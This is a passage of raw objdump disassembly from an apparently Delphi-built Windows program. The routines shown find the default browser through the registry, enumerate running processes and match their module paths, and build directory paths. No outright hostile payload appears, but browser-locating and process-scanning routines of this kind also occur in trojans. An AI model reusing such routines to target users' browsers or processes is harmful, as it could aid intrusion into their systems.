  40688b:	ff 29                	ljmp   *(%ecx)
  40688d:	00 00                	add    %al,(%eax)
  40688f:	00 53 4f             	add    %dl,0x4f(%ebx)
  406892:	46                   	inc    %esi
  406893:	54                   	push   %esp
  406894:	57                   	push   %edi
  406895:	41                   	inc    %ecx
  406896:	52                   	push   %edx
  406897:	45                   	inc    %ebp
  406898:	5c                   	pop    %esp
  406899:	4d                   	dec    %ebp
  40689a:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4068a1:	74 5c                	je     0x4068ff
  4068a3:	57                   	push   %edi
  4068a4:	69 6e 64 6f 77 73 5c 	imul   $0x5c73776f,0x64(%esi),%ebp
  4068ab:	43                   	inc    %ebx
  4068ac:	75 72                	jne    0x406920
  4068ae:	72 65                	jb     0x406915
  4068b0:	6e                   	outsb  %ds:(%esi),(%dx)
  4068b1:	74 56                	je     0x406909
  4068b3:	65 72 73             	gs jb  0x406929
  4068b6:	69 6f 6e 00 00 00 ff 	imul   $0xff000000,0x6e(%edi),%ebp
  4068bd:	ff                   	(bad)
  4068be:	ff                   	(bad)
  4068bf:	ff 0f                	decl   (%edi)
  4068c1:	00 00                	add    %al,(%eax)
  4068c3:	00 50 72             	add    %dl,0x72(%eax)
  4068c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4068c7:	67 72 61             	addr16 jb 0x40692b
  4068ca:	6d                   	insl   (%dx),%es:(%edi)
  4068cb:	46                   	inc    %esi
  4068cc:	69 6c 65 73 44 69 72 	imul   $0x726944,0x73(%ebp,%eiz,2),%ebp
  4068d3:	00 
  4068d4:	55                   	push   %ebp
  4068d5:	8b ec                	mov    %esp,%ebp
  4068d7:	33 c9                	xor    %ecx,%ecx
  4068d9:	51                   	push   %ecx
  4068da:	51                   	push   %ecx
  4068db:	51                   	push   %ecx
  4068dc:	51                   	push   %ecx
  4068dd:	51                   	push   %ecx
  4068de:	53                   	push   %ebx
  4068df:	8b d8                	mov    %eax,%ebx
  4068e1:	33 c0                	xor    %eax,%eax
  4068e3:	55                   	push   %ebp
  4068e4:	68 bb 69 40 00       	push   $0x4069bb
  4068e9:	64 ff 30             	push   %fs:(%eax)
  4068ec:	64 89 20             	mov    %esp,%fs:(%eax)
  4068ef:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4068f2:	ba d0 69 40 00       	mov    $0x4069d0,%edx
  4068f7:	e8 ec ce ff ff       	call   0x4037e8
  4068fc:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4068ff:	e8 4c ce ff ff       	call   0x403750
  406904:	6a 00                	push   $0x0
  406906:	53                   	push   %ebx
  406907:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40690a:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40690d:	b8 00 00 00 80       	mov    $0x80000000,%eax
  406912:	e8 b1 fd ff ff       	call   0x4066c8
  406917:	83 3b 00             	cmpl   $0x0,(%ebx)
  40691a:	0f 84 80 00 00 00    	je     0x4069a0
  406920:	8b 03                	mov    (%ebx),%eax
  406922:	80 38 22             	cmpb   $0x22,(%eax)
  406925:	75 20                	jne    0x406947
  406927:	53                   	push   %ebx
  406928:	8b 13                	mov    (%ebx),%edx
  40692a:	b8 f0 69 40 00       	mov    $0x4069f0,%eax
  40692f:	e8 78 d2 ff ff       	call   0x403bac
  406934:	8b c8                	mov    %eax,%ecx
  406936:	83 c1 02             	add    $0x2,%ecx
  406939:	8b 03                	mov    (%ebx),%eax
  40693b:	ba 02 00 00 00       	mov    $0x2,%edx
  406940:	e8 df d1 ff ff       	call   0x403b24
  406945:	eb 1e                	jmp    0x406965
  406947:	53                   	push   %ebx
  406948:	8b 13                	mov    (%ebx),%edx
  40694a:	b8 f0 69 40 00       	mov    $0x4069f0,%eax
  40694f:	e8 58 d2 ff ff       	call   0x403bac
  406954:	8b c8                	mov    %eax,%ecx
  406956:	83 c1 03             	add    $0x3,%ecx
  406959:	8b 03                	mov    (%ebx),%eax
  40695b:	ba 01 00 00 00       	mov    $0x1,%edx
  406960:	e8 bf d1 ff ff       	call   0x403b24
  406965:	8d 55 f0             	lea    -0x10(%ebp),%edx
  406968:	8b 03                	mov    (%ebx),%eax
  40696a:	e8 49 fe ff ff       	call   0x4067b8
  40696f:	8b 45 f0             	mov    -0x10(%ebp),%eax
  406972:	8d 55 f4             	lea    -0xc(%ebp),%edx
  406975:	e8 de 07 00 00       	call   0x407158
  40697a:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40697d:	ba 00 6a 40 00       	mov    $0x406a00,%edx
  406982:	e8 89 d0 ff ff       	call   0x403a10
  406987:	74 17                	je     0x4069a0
  406989:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40698c:	e8 8b fe ff ff       	call   0x40681c
  406991:	8b 55 ec             	mov    -0x14(%ebp),%edx
  406994:	8b c3                	mov    %ebx,%eax
  406996:	b9 0c 6a 40 00       	mov    $0x406a0c,%ecx
  40699b:	e8 70 cf ff ff       	call   0x403910
  4069a0:	33 c0                	xor    %eax,%eax
  4069a2:	5a                   	pop    %edx
  4069a3:	59                   	pop    %ecx
  4069a4:	59                   	pop    %ecx
  4069a5:	64 89 10             	mov    %edx,%fs:(%eax)
  4069a8:	68 c2 69 40 00       	push   $0x4069c2
  4069ad:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4069b0:	ba 05 00 00 00       	mov    $0x5,%edx
  4069b5:	e8 ba cd ff ff       	call   0x403774
  4069ba:	c3                   	ret
  4069bb:	e9 04 c8 ff ff       	jmp    0x4031c4
  4069c0:	eb eb                	jmp    0x4069ad
  4069c2:	5b                   	pop    %ebx
  4069c3:	8b e5                	mov    %ebp,%esp
  4069c5:	5d                   	pop    %ebp
  4069c6:	c3                   	ret
  4069c7:	00 ff                	add    %bh,%bh
  4069c9:	ff                   	(bad)
  4069ca:	ff                   	(bad)
  4069cb:	ff 17                	call   *(%edi)
  4069cd:	00 00                	add    %al,(%eax)
  4069cf:	00 68 74             	add    %ch,0x74(%eax)
  4069d2:	74 70                	je     0x406a44
  4069d4:	5c                   	pop    %esp
  4069d5:	73 68                	jae    0x406a3f
  4069d7:	65 6c                	gs insb (%dx),%es:(%edi)
  4069d9:	6c                   	insb   (%dx),%es:(%edi)
  4069da:	5c                   	pop    %esp
  4069db:	6f                   	outsl  %ds:(%esi),(%dx)
  4069dc:	70 65                	jo     0x406a43
  4069de:	6e                   	outsb  %ds:(%esi),(%dx)
  4069df:	5c                   	pop    %esp
  4069e0:	63 6f 6d             	arpl   %ebp,0x6d(%edi)
  4069e3:	6d                   	insl   (%dx),%es:(%edi)
  4069e4:	61                   	popa
  4069e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4069e6:	64 00 ff             	fs add %bh,%bh
  4069e9:	ff                   	(bad)
  4069ea:	ff                   	(bad)
  4069eb:	ff 04 00             	incl   (%eax,%eax,1)
  4069ee:	00 00                	add    %al,(%eax)
  4069f0:	2e 65 78 65          	cs js,pn 0x406a59
  4069f4:	00 00                	add    %al,(%eax)
  4069f6:	00 00                	add    %al,(%eax)
  4069f8:	ff                   	(bad)
  4069f9:	ff                   	(bad)
  4069fa:	ff                   	(bad)
  4069fb:	ff 03                	incl   (%ebx)
  4069fd:	00 00                	add    %al,(%eax)
  4069ff:	00 45 58             	add    %al,0x58(%ebp)
  406a02:	45                   	inc    %ebp
  406a03:	00 ff                	add    %bh,%bh
  406a05:	ff                   	(bad)
  406a06:	ff                   	(bad)
  406a07:	ff 1f                	lcall  *(%edi)
  406a09:	00 00                	add    %al,(%eax)
  406a0b:	00 5c 49 6e          	add    %bl,0x6e(%ecx,%ecx,2)
  406a0f:	74 65                	je     0x406a76
  406a11:	72 6e                	jb     0x406a81
  406a13:	65 74 20             	gs je  0x406a36
  406a16:	45                   	inc    %ebp
  406a17:	78 70                	js     0x406a89
  406a19:	6c                   	insb   (%dx),%es:(%edi)
  406a1a:	6f                   	outsl  %ds:(%esi),(%dx)
  406a1b:	72 65                	jb     0x406a82
  406a1d:	72 5c                	jb     0x406a7b
  406a1f:	69 65 78 70 6c 6f 72 	imul   $0x726f6c70,0x78(%ebp),%esp
  406a26:	65 2e 65 78 65       	gs cs js,pn 0x406a90
  406a2b:	00 33                	add    %dh,(%ebx)
  406a2d:	d2 eb                	shr    %cl,%bl
  406a2f:	01 42 80             	add    %eax,-0x80(%edx)
  406a32:	3c 10                	cmp    $0x10,%al
  406a34:	00 75 f9             	add    %dh,-0x7(%ebp)
  406a37:	8b c2                	mov    %edx,%eax
  406a39:	c3                   	ret
  406a3a:	8b c0                	mov    %eax,%eax
  406a3c:	55                   	push   %ebp
  406a3d:	8b ec                	mov    %esp,%ebp
  406a3f:	51                   	push   %ecx
  406a40:	53                   	push   %ebx
  406a41:	56                   	push   %esi
  406a42:	57                   	push   %edi
  406a43:	8b da                	mov    %edx,%ebx
  406a45:	8b f0                	mov    %eax,%esi
  406a47:	8b c3                	mov    %ebx,%eax
  406a49:	e8 02 cd ff ff       	call   0x403750
  406a4e:	56                   	push   %esi
  406a4f:	6a 00                	push   $0x0
  406a51:	68 10 04 00 00       	push   $0x410
  406a56:	e8 c5 e1 ff ff       	call   0x404c20
  406a5b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406a5e:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  406a62:	0f 84 88 00 00 00    	je     0x406af0
  406a68:	33 c0                	xor    %eax,%eax
  406a6a:	55                   	push   %ebp
  406a6b:	68 e9 6a 40 00       	push   $0x406ae9
  406a70:	64 ff 30             	push   %fs:(%eax)
  406a73:	64 89 20             	mov    %esp,%fs:(%eax)
  406a76:	8b c3                	mov    %ebx,%eax
  406a78:	ba 04 01 00 00       	mov    $0x104,%edx
  406a7d:	e8 72 d1 ff ff       	call   0x403bf4
  406a82:	68 f8 6a 40 00       	push   $0x406af8
  406a87:	e8 7c e1 ff ff       	call   0x404c08
  406a8c:	8b f0                	mov    %eax,%esi
  406a8e:	68 04 6b 40 00       	push   $0x406b04
  406a93:	56                   	push   %esi
  406a94:	e8 5f e1 ff ff       	call   0x404bf8
  406a99:	89 c7                	mov    %eax,%edi
  406a9b:	68 04 01 00 00       	push   $0x104
  406aa0:	8b 03                	mov    (%ebx),%eax
  406aa2:	e8 1d d0 ff ff       	call   0x403ac4
  406aa7:	50                   	push   %eax
  406aa8:	6a 00                	push   $0x0
  406aaa:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406aad:	50                   	push   %eax
  406aae:	ff d7                	call   *%edi
  406ab0:	85 c0                	test   %eax,%eax
  406ab2:	76 17                	jbe    0x406acb
  406ab4:	8b 03                	mov    (%ebx),%eax
  406ab6:	e8 09 d0 ff ff       	call   0x403ac4
  406abb:	e8 6c ff ff ff       	call   0x406a2c
  406ac0:	8b d0                	mov    %eax,%edx
  406ac2:	8b c3                	mov    %ebx,%eax
  406ac4:	e8 2b d1 ff ff       	call   0x403bf4
  406ac9:	eb 07                	jmp    0x406ad2
  406acb:	8b c3                	mov    %ebx,%eax
  406acd:	e8 7e cc ff ff       	call   0x403750
  406ad2:	33 c0                	xor    %eax,%eax
  406ad4:	5a                   	pop    %edx
  406ad5:	59                   	pop    %ecx
  406ad6:	59                   	pop    %ecx
  406ad7:	64 89 10             	mov    %edx,%fs:(%eax)
  406ada:	68 f0 6a 40 00       	push   $0x406af0
  406adf:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406ae2:	50                   	push   %eax
  406ae3:	e8 60 e0 ff ff       	call   0x404b48
  406ae8:	c3                   	ret
  406ae9:	e9 d6 c6 ff ff       	jmp    0x4031c4
  406aee:	eb ef                	jmp    0x406adf
  406af0:	5f                   	pop    %edi
  406af1:	5e                   	pop    %esi
  406af2:	5b                   	pop    %ebx
  406af3:	59                   	pop    %ecx
  406af4:	5d                   	pop    %ebp
  406af5:	c3                   	ret
  406af6:	00 00                	add    %al,(%eax)
  406af8:	50                   	push   %eax
  406af9:	53                   	push   %ebx
  406afa:	41                   	inc    %ecx
  406afb:	50                   	push   %eax
  406afc:	49                   	dec    %ecx
  406afd:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  406b00:	6c                   	insb   (%dx),%es:(%edi)
  406b01:	00 00                	add    %al,(%eax)
  406b03:	00 47 65             	add    %al,0x65(%edi)
  406b06:	74 4d                	je     0x406b55
  406b08:	6f                   	outsl  %ds:(%esi),(%dx)
  406b09:	64 75 6c             	fs jne 0x406b78
  406b0c:	65 46                	gs inc %esi
  406b0e:	69 6c 65 4e 61 6d 65 	imul   $0x45656d61,0x4e(%ebp,%eiz,2),%ebp
  406b15:	45 
  406b16:	78 41                	js     0x406b59
  406b18:	00 00                	add    %al,(%eax)
  406b1a:	00 00                	add    %al,(%eax)
  406b1c:	55                   	push   %ebp
  406b1d:	8b ec                	mov    %esp,%ebp
  406b1f:	81 c4 b8 fe ff ff    	add    $0xfffffeb8,%esp
  406b25:	53                   	push   %ebx
  406b26:	56                   	push   %esi
  406b27:	57                   	push   %edi
  406b28:	33 c9                	xor    %ecx,%ecx
  406b2a:	89 8d c0 fe ff ff    	mov    %ecx,-0x140(%ebp)
  406b30:	89 8d b8 fe ff ff    	mov    %ecx,-0x148(%ebp)
  406b36:	89 8d bc fe ff ff    	mov    %ecx,-0x144(%ebp)
  406b3c:	89 8d d0 fe ff ff    	mov    %ecx,-0x130(%ebp)
  406b42:	89 8d c4 fe ff ff    	mov    %ecx,-0x13c(%ebp)
  406b48:	89 8d cc fe ff ff    	mov    %ecx,-0x134(%ebp)
  406b4e:	89 8d c8 fe ff ff    	mov    %ecx,-0x138(%ebp)
  406b54:	8b f2                	mov    %edx,%esi
  406b56:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406b59:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406b5c:	e8 53 cf ff ff       	call   0x403ab4
  406b61:	33 c0                	xor    %eax,%eax
  406b63:	55                   	push   %ebp
  406b64:	68 8f 6c 40 00       	push   $0x406c8f
  406b69:	64 ff 30             	push   %fs:(%eax)
  406b6c:	64 89 20             	mov    %esp,%fs:(%eax)
  406b6f:	33 c0                	xor    %eax,%eax
  406b71:	89 06                	mov    %eax,(%esi)
  406b73:	33 d2                	xor    %edx,%edx
  406b75:	b8 02 00 00 00       	mov    $0x2,%eax
  406b7a:	e8 b9 f3 ff ff       	call   0x405f38
  406b7f:	8b f8                	mov    %eax,%edi
  406b81:	c7 85 d4 fe ff ff 28 	movl   $0x128,-0x12c(%ebp)
  406b88:	01 00 00 
  406b8b:	8d 95 d4 fe ff ff    	lea    -0x12c(%ebp),%edx
  406b91:	8b c7                	mov    %edi,%eax
  406b93:	e8 c0 f3 ff ff       	call   0x405f58
  406b98:	33 db                	xor    %ebx,%ebx
  406b9a:	e9 bc 00 00 00       	jmp    0x406c5b
  406b9f:	8d 85 c8 fe ff ff    	lea    -0x138(%ebp),%eax
  406ba5:	8d 95 f8 fe ff ff    	lea    -0x108(%ebp),%edx
  406bab:	b9 04 01 00 00       	mov    $0x104,%ecx
  406bb0:	e8 f7 cc ff ff       	call   0x4038ac
  406bb5:	8b 85 c8 fe ff ff    	mov    -0x138(%ebp),%eax
  406bbb:	8d 95 cc fe ff ff    	lea    -0x134(%ebp),%edx
  406bc1:	e8 f6 04 00 00       	call   0x4070bc
  406bc6:	8b 85 cc fe ff ff    	mov    -0x134(%ebp),%eax
  406bcc:	8d 95 d0 fe ff ff    	lea    -0x130(%ebp),%edx
  406bd2:	e8 81 05 00 00       	call   0x407158
  406bd7:	8b 85 d0 fe ff ff    	mov    -0x130(%ebp),%eax
  406bdd:	50                   	push   %eax
  406bde:	8d 95 c4 fe ff ff    	lea    -0x13c(%ebp),%edx
  406be4:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406be7:	e8 6c 05 00 00       	call   0x407158
  406bec:	8b 95 c4 fe ff ff    	mov    -0x13c(%ebp),%edx
  406bf2:	58                   	pop    %eax
  406bf3:	e8 18 ce ff ff       	call   0x403a10
  406bf8:	74 4a                	je     0x406c44
  406bfa:	8d 85 bc fe ff ff    	lea    -0x144(%ebp),%eax
  406c00:	8d 95 f8 fe ff ff    	lea    -0x108(%ebp),%edx
  406c06:	b9 04 01 00 00       	mov    $0x104,%ecx
  406c0b:	e8 9c cc ff ff       	call   0x4038ac
  406c10:	8b 85 bc fe ff ff    	mov    -0x144(%ebp),%eax
  406c16:	8d 95 c0 fe ff ff    	lea    -0x140(%ebp),%edx
  406c1c:	e8 37 05 00 00       	call   0x407158
  406c21:	8b 85 c0 fe ff ff    	mov    -0x140(%ebp),%eax
  406c27:	50                   	push   %eax
  406c28:	8d 95 b8 fe ff ff    	lea    -0x148(%ebp),%edx
  406c2e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406c31:	e8 22 05 00 00       	call   0x407158
  406c36:	8b 95 b8 fe ff ff    	mov    -0x148(%ebp),%edx
  406c3c:	58                   	pop    %eax
  406c3d:	e8 ce cd ff ff       	call   0x403a10
  406c42:	75 0a                	jne    0x406c4e
  406c44:	b3 01                	mov    $0x1,%bl
  406c46:	8b 85 dc fe ff ff    	mov    -0x124(%ebp),%eax
  406c4c:	89 06                	mov    %eax,(%esi)
  406c4e:	8d 95 d4 fe ff ff    	lea    -0x12c(%ebp),%edx
  406c54:	8b c7                	mov    %edi,%eax
  406c56:	e8 1d f3 ff ff       	call   0x405f78
  406c5b:	85 c0                	test   %eax,%eax
  406c5d:	0f 85 3c ff ff ff    	jne    0x406b9f
  406c63:	57                   	push   %edi
  406c64:	e8 df de ff ff       	call   0x404b48
  406c69:	33 c0                	xor    %eax,%eax
  406c6b:	5a                   	pop    %edx
  406c6c:	59                   	pop    %ecx
  406c6d:	59                   	pop    %ecx
  406c6e:	64 89 10             	mov    %edx,%fs:(%eax)
  406c71:	68 96 6c 40 00       	push   $0x406c96
  406c76:	8d 85 b8 fe ff ff    	lea    -0x148(%ebp),%eax
  406c7c:	ba 07 00 00 00       	mov    $0x7,%edx
  406c81:	e8 ee ca ff ff       	call   0x403774
  406c86:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406c89:	e8 c2 ca ff ff       	call   0x403750
  406c8e:	c3                   	ret
  406c8f:	e9 30 c5 ff ff       	jmp    0x4031c4
  406c94:	eb e0                	jmp    0x406c76
  406c96:	8b c3                	mov    %ebx,%eax
  406c98:	5f                   	pop    %edi
  406c99:	5e                   	pop    %esi
  406c9a:	5b                   	pop    %ebx
  406c9b:	8b e5                	mov    %ebp,%esp
  406c9d:	5d                   	pop    %ebp
  406c9e:	c3                   	ret
  406c9f:	90                   	nop
  406ca0:	53                   	push   %ebx
  406ca1:	8b d8                	mov    %eax,%ebx
  406ca3:	8b c3                	mov    %ebx,%eax
  406ca5:	e8 1a ce ff ff       	call   0x403ac4
  406caa:	50                   	push   %eax
  406cab:	e8 30 df ff ff       	call   0x404be0
  406cb0:	83 f8 ff             	cmp    $0xffffffff,%eax
  406cb3:	74 04                	je     0x406cb9
  406cb5:	a8 10                	test   $0x10,%al
  406cb7:	75 04                	jne    0x406cbd
  406cb9:	33 c0                	xor    %eax,%eax
  406cbb:	5b                   	pop    %ebx
  406cbc:	c3                   	ret
  406cbd:	b0 01                	mov    $0x1,%al
  406cbf:	5b                   	pop    %ebx
  406cc0:	c3                   	ret
  406cc1:	8d 40 00             	lea    0x0(%eax),%eax
  406cc4:	55                   	push   %ebp
  406cc5:	8b ec                	mov    %esp,%ebp
  406cc7:	33 c9                	xor    %ecx,%ecx
  406cc9:	51                   	push   %ecx
  406cca:	51                   	push   %ecx
  406ccb:	51                   	push   %ecx
  406ccc:	51                   	push   %ecx
  406ccd:	53                   	push   %ebx
  406cce:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406cd1:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406cd4:	e8 db cd ff ff       	call   0x403ab4
  406cd9:	33 c0                	xor    %eax,%eax
  406cdb:	55                   	push   %ebp
  406cdc:	68 d4 6d 40 00       	push   $0x406dd4
  406ce1:	64 ff 30             	push   %fs:(%eax)
  406ce4:	64 89 20             	mov    %esp,%fs:(%eax)
  406ce7:	33 db                	xor    %ebx,%ebx
  406ce9:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  406ced:	0f 84 c6 00 00 00    	je     0x406db9
  406cf3:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406cf6:	e8 a5 ff ff ff       	call   0x406ca0
  406cfb:	3c 01                	cmp    $0x1,%al
  406cfd:	75 07                	jne    0x406d06
  406cff:	b3 01                	mov    $0x1,%bl
  406d01:	e9 b3 00 00 00       	jmp    0x406db9
  406d06:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406d09:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406d0c:	e8 d7 ca ff ff       	call   0x4037e8
  406d11:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406d14:	e8 ab cb ff ff       	call   0x4038c4
  406d19:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406d1c:	80 7c 02 ff 5c       	cmpb   $0x5c,-0x1(%edx,%eax,1)
  406d21:	74 7c                	je     0x406d9f
  406d23:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406d26:	ba ec 6d 40 00       	mov    $0x406dec,%edx
  406d2b:	e8 9c cb ff ff       	call   0x4038cc
  406d30:	eb 6d                	jmp    0x406d9f
  406d32:	8d 45 f0             	lea    -0x10(%ebp),%eax
  406d35:	50                   	push   %eax
  406d36:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406d39:	b8 ec 6d 40 00       	mov    $0x406dec,%eax
  406d3e:	e8 69 ce ff ff       	call   0x403bac
  406d43:	8b c8                	mov    %eax,%ecx
  406d45:	ba 01 00 00 00       	mov    $0x1,%edx
  406d4a:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406d4d:	e8 d2 cd ff ff       	call   0x403b24
  406d52:	8b 55 f0             	mov    -0x10(%ebp),%edx
  406d55:	8d 45 f4             	lea    -0xc(%ebp),%eax
  406d58:	e8 6f cb ff ff       	call   0x4038cc
  406d5d:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406d60:	b8 ec 6d 40 00       	mov    $0x406dec,%eax
  406d65:	e8 42 ce ff ff       	call   0x403bac
  406d6a:	8b c8                	mov    %eax,%ecx
  406d6c:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406d6f:	ba 01 00 00 00       	mov    $0x1,%edx
  406d74:	e8 eb cd ff ff       	call   0x403b64
  406d79:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406d7c:	e8 1f ff ff ff       	call   0x406ca0
  406d81:	84 c0                	test   %al,%al
  406d83:	75 1a                	jne    0x406d9f
  406d85:	6a 00                	push   $0x0
  406d87:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406d8a:	e8 35 cd ff ff       	call   0x403ac4
  406d8f:	50                   	push   %eax
  406d90:	e8 c3 dd ff ff       	call   0x404b58
  406d95:	83 f8 01             	cmp    $0x1,%eax
  406d98:	1b c0                	sbb    %eax,%eax
  406d9a:	40                   	inc    %eax
  406d9b:	84 c0                	test   %al,%al
  406d9d:	74 1a                	je     0x406db9
  406d9f:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406da2:	b8 ec 6d 40 00       	mov    $0x406dec,%eax
  406da7:	e8 00 ce ff ff       	call   0x403bac
  406dac:	48                   	dec    %eax
  406dad:	7d 83                	jge    0x406d32
  406daf:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406db2:	e8 e9 fe ff ff       	call   0x406ca0
  406db7:	8b d8                	mov    %eax,%ebx
  406db9:	33 c0                	xor    %eax,%eax
  406dbb:	5a                   	pop    %edx
  406dbc:	59                   	pop    %ecx
  406dbd:	59                   	pop    %ecx
  406dbe:	64 89 10             	mov    %edx,%fs:(%eax)
  406dc1:	68 db 6d 40 00       	push   $0x406ddb
  406dc6:	8d 45 f0             	lea    -0x10(%ebp),%eax
  406dc9:	ba 04 00 00 00       	mov    $0x4,%edx
  406dce:	e8 a1 c9 ff ff       	call   0x403774
  406dd3:	c3                   	ret
  406dd4:	e9 eb c3 ff ff       	jmp    0x4031c4
  406dd9:	eb eb                	jmp    0x406dc6
  406ddb:	8b c3                	mov    %ebx,%eax
  406ddd:	5b                   	pop    %ebx
  406dde:	8b e5                	mov    %ebp,%esp
  406de0:	5d                   	pop    %ebp
  406de1:	c3                   	ret
  406de2:	00 00                	add    %al,(%eax)
  406de4:	ff                   	(bad)
  406de5:	ff                   	(bad)
  406de6:	ff                   	(bad)
  406de7:	ff 01                	incl   (%ecx)
  406de9:	00 00                	add    %al,(%eax)
  406deb:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  406def:	00 55 8b             	add    %dl,-0x75(%ebp)
  406df2:	ec                   	in     (%dx),%al
  406df3:	33 c0                	xor    %eax,%eax
  406df5:	55                   	push   %ebp
  406df6:	68 15 6e 40 00       	push   $0x406e15
  406dfb:	64 ff 30             	push   %fs:(%eax)
  406dfe:	64 89 20             	mov    %esp,%fs:(%eax)
  406e01:	ff 05 60 b8 40 00    	incl   0x40b860
  406e07:	33 c0                	xor    %eax,%eax
  406e09:	5a                   	pop    %edx
  406e0a:	59                   	pop    %ecx
  406e0b:	59                   	pop    %ecx
  406e0c:	64 89 10             	mov    %edx,%fs:(%eax)
  406e0f:	68 1c 6e 40 00       	push   $0x406e1c
  406e14:	c3                   	ret
  406e15:	e9 aa c3 ff ff       	jmp    0x4031c4
  406e1a:	eb f8                	jmp    0x406e14
  406e1c:	5d                   	pop    %ebp
  406e1d:	c3                   	ret
  406e1e:	8b c0                	mov    %eax,%eax
  406e20:	83 2d 60 b8 40 00 01 	subl   $0x1,0x40b860
  406e27:	c3                   	ret
  406e28:	55                   	push   %ebp
  406e29:	8b ec                	mov    %esp,%ebp
  406e2b:	83 c4 f8             	add    $0xfffffff8,%esp
  406e2e:	53                   	push   %ebx
  406e2f:	33 c9                	xor    %ecx,%ecx
  406e31:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  406e34:	8b da                	mov    %edx,%ebx
  406e36:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406e39:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406e3c:	e8 73 cc ff ff       	call   0x403ab4
  406e41:	33 c0                	xor    %eax,%eax
  406e43:	55                   	push   %ebp
  406e44:	68 a4 6e 40 00       	push   $0x406ea4
  406e49:	64 ff 30             	push   %fs:(%eax)
  406e4c:	64 89 20             	mov    %esp,%fs:(%eax)
  406e4f:	8b c3                	mov    %ebx,%eax
  406e51:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406e54:	e8 4b c9 ff ff       	call   0x4037a4
  406e59:	8b 03                	mov    (%ebx),%eax
  406e5b:	e8 64 ca ff ff       	call   0x4038c4
  406e60:	8b 13                	mov    (%ebx),%edx
  406e62:	80 7c 02 ff 5c       	cmpb   $0x5c,-0x1(%edx,%eax,1)
  406e67:	74 20                	je     0x406e89
  406e69:	8b 13                	mov    (%ebx),%edx
  406e6b:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406e6e:	b9 b8 6e 40 00       	mov    $0x406eb8,%ecx
  406e73:	e8 98 ca ff ff       	call   0x403910
  406e78:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406e7b:	e8 44 cc ff ff       	call   0x403ac4
  406e80:	8b d0                	mov    %eax,%edx
  406e82:	8b c3                	mov    %ebx,%eax
  406e84:	e8 e7 c9 ff ff       	call   0x403870
  406e89:	33 c0                	xor    %eax,%eax
  406e8b:	5a                   	pop    %edx
  406e8c:	59                   	pop    %ecx
  406e8d:	59                   	pop    %ecx
  406e8e:	64 89 10             	mov    %edx,%fs:(%eax)
  406e91:	68 ab 6e 40 00       	push   $0x406eab
  406e96:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406e99:	ba 02 00 00 00       	mov    $0x2,%edx
  406e9e:	e8 d1 c8 ff ff       	call   0x403774
  406ea3:	c3                   	ret
  406ea4:	e9 1b c3 ff ff       	jmp    0x4031c4
  406ea9:	eb eb                	jmp    0x406e96
  406eab:	5b                   	pop    %ebx
  406eac:	59                   	pop    %ecx
  406ead:	59                   	pop    %ecx
  406eae:	5d                   	pop    %ebp
  406eaf:	c3                   	ret
  406eb0:	ff                   	(bad)
  406eb1:	ff                   	(bad)
  406eb2:	ff                   	(bad)
  406eb3:	ff 01                	incl   (%ecx)
  406eb5:	00 00                	add    %al,(%eax)
  406eb7:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  406ebb:	00 56 92             	add    %dl,-0x6e(%esi)
  406ebe:	50                   	push   %eax
  406ebf:	e8 e0 c8 ff ff       	call   0x4037a4
  406ec4:	58                   	pop    %eax
  406ec5:	e8 4a cc ff ff       	call   0x403b14
  406eca:	50                   	push   %eax
  406ecb:	e8 f4 c9 ff ff       	call   0x4038c4
  406ed0:	5e                   	pop    %esi
  406ed1:	91                   	xchg   %eax,%ecx
  406ed2:	e3 0d                	jecxz  0x406ee1
  406ed4:	ac                   	lods   %ds:(%esi),%al
  406ed5:	2c 41                	sub    $0x41,%al
  406ed7:	3c 1a                	cmp    $0x1a,%al
  406ed9:	73 04                	jae    0x406edf
  406edb:	80 46 ff 20          	addb   $0x20,-0x1(%esi)
  406edf:	e2 f3                	loop   0x406ed4
  406ee1:	5e                   	pop    %esi
  406ee2:	c3                   	ret
  406ee3:	90                   	nop
  406ee4:	55                   	push   %ebp
  406ee5:	8b ec                	mov    %esp,%ebp
  406ee7:	81 c4 f8 fe ff ff    	add    $0xfffffef8,%esp
  406eed:	53                   	push   %ebx
  406eee:	56                   	push   %esi
  406eef:	33 d2                	xor    %edx,%edx
  406ef1:	89 55 f8             	mov    %edx,-0x8(%ebp)
  406ef4:	8b f0                	mov    %eax,%esi
